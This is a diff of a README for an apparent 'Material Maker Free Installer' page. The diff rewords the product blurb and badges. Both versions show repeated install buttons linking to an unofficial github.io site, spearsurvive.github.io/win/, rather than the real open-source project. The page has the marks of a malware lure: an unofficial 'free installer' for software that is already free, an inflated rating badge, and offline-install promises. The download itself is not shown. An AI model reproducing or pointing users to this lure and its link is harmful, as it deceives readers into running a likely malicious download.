@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Texture+Creation-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Texture+Generation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Material Maker Free Installer** — Material Maker is a free, open-source procedural texture creation tool built on Godot Engine. Works without internet access, no account required. Full offline installation.
+**💻 Material Maker Free Installer** — Material Maker is a free, open-source procedural texture and material generation tool for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Material Maker
 
-Material Maker is a free, open-source procedural texture creation tool built on Godot Engine. It generates tileable PBR materials through a node-based graph system, supports export to game engines, and provides a large library of procedural generators and filters.
+Material Maker is a free, open-source procedural texture and material generation tool for Windows, macOS, and Linux. Create tileable textures using a node-based visual system, combining generators, filters, and blending operations. Export textures for use in game engines and 3D applications. Material Maker is a free alternative to Substance Designer for creating PBR material textures.
 
 ---
 
 ## ❌ Problem: Material Maker is hard to access
 
-- **Godot-Based** — Uses Godot Engine runtime which adds overhead and limits some GPU features
-- **Complex Node System** — Procedural material creation has a steep learning curve
-- **Limited Documentation** — Community resources are growing but still sparse
-- **Export Compatibility** — Some game engine export formats require manual conversion
+- **Learning Curve** — Node-based texture creation requires understanding of material concepts
+- **Community Size** — Smaller than Substance Designer community
+- **Feature Completeness** — Less feature-rich than Adobe Substance Designer for complex materials
+- **Documentation** — Node documentation less comprehensive than commercial alternatives
 
 ---
 
@@ -81,7 +81,7 @@ Material Maker is a free, open-source procedural texture creation tool built on 
 
 <div align="center">
 
-[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Material Maker is a free, open-source procedural texture creation tool built on 
 
 ---
 
-**Material Maker Free Installer** — Material Maker is a free, open-source procedural texture creation tool built on Godot Engine. Install without internet connection today!
+**Material Maker Free Installer** — Material Maker is a free, open-source procedural texture and material generation tool for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Material Maker](https://img.shields.io/badge/⬇_Install_Material+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
